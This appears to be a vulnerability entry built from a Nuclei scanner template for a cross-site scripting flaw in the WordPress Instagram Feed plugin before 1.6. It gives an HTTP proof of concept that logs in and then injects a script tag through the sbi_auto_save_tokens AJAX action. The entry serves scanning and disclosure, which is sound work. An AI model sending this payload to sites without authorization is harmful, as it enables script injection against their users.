# Nuclei Template: Instagram Feed < 1.6 - Cross-Site Scripting
**Template ID:** wp-instagram-feed-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-instagram-feed-xss.yaml`)

## Vulnerability Information & PoC

## Description
The Instagram Feed WordPress plugin before 1.6 contains a reflected cross-site scripting (XSS) vulnerability due to improper sanitization of user-supplied input, allowing attackers to inject malicious scripts via crafted requests.

## Impact
Attackers with administrator privileges can execute malicious Javascript in the context of the site, potentially stealing cookies or hijacking user sessions.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>
```

## Remediation
Update to version 1.6 or later.

## References
- https://dumpco.re/blog/xss-instagram-feed
- https://wordpress.org/plugins/instagram-feed
